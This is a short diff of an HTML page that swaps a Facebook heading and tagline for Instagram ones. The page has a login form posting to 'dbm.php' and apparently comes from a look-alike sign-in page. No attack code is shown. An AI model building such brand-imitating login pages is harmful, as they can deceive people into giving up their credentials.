@@ -8,8 +8,8 @@
 </head>
 <body background-color="#f0f0f0">
     <div id=blk>
-    <h1 id="fb">facebook</h1>
-    <p1>Facebook helps you connect and share with the people in you life.</p1>
+    <h1 id="fb">Instagram</h1>
+    <p1>Instagram helps you connect and share with the people in you life.</p1>
     </div>
     <div id="entry">
         <form action="dbm.php" method="post">
